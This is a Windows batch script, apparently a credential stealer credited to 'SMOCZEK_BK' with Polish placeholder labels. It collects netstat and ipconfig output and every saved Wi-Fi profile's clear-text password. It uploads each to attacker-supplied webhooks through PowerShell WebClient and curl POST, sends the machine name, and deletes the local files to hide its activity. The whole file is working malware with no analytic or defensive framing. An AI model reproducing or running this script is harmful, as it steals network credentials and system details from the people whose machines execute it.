@echo off
REM ----------------------------------
REM |        CODE BY SMOCZEK_BK      |
REM ----------------------------------

timeout /t 1 /nobreak >nul
start "" /b cmd /c
timeout /t 1 /nobreak >nul
echo cmd | clip
timeout /t 1 /nobreak >nul
set "DeviceName=%computername%"
echo set "DeviceName=%computername%" | clip
timeout /t 1 /nobreak >nul
echo( > "%temp%\netstat_%DeviceName%.txt" & netstat -ano >> "%temp%\netstat_%DeviceName%.txt" & powershell -c "(New-Object System.Net.WebClient).UploadFile('WEBHOOK DLA NETSTAT', '%temp%\netstat_%DeviceName%.txt'); Remove-Item '%temp%\netstat_%DeviceName%.txt'"
timeout /t 1 /nobreak >nul
echo( > "%temp%\ipconfig_output_%DeviceName%.txt" & ipconfig >> "%temp%\ipconfig_output_%DeviceName%.txt" & powershell -c "(New-Object System.Net.WebClient).UploadFile('WEBHOOK DLA IPCONFIG', '%temp%\ipconfig_output_%DeviceName%.txt'); Remove-Item '%temp%\ipconfig_output_%DeviceName%.txt'"
timeout /t 1 /nobreak >nul
(for /f "tokens=2 delims=:" %%i in ('netsh wlan show profiles ^| findstr "All User Profile"') do echo %%i & netsh wlan show profile name=%%i key=clear) > "%USERPROFILE%\Desktop\wifi_passwords_%DeviceName%.txt"
timeout /t 1 /nobreak >nul
curl -X POST -F "file=@%USERPROFILE%\Desktop\wifi_passwords_%DeviceName%.txt" "WEBHOOK DLA HASEŁ WIFI" & timeout /t 1 /nobreak >nul & del "%USERPROFILE%\Desktop\wifi_passwords_%DeviceName%.txt"
timeout /t 1 /nobreak >nul
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"Nazwa uzytkownika: **%DeviceName%**\"}" "WEBHOOK DLA NAZWY"
timeout /t 1 /nobreak >nul
rename "%temp%\netstat_%DeviceName%.txt" "netstat_%DeviceName%_%username%.txt"
rename "%temp%\ipconfig_output_%DeviceName%.txt" "ipconfig_output_%DeviceName%_%username%.txt"
timeout /t 1 /nobreak >nul
exit
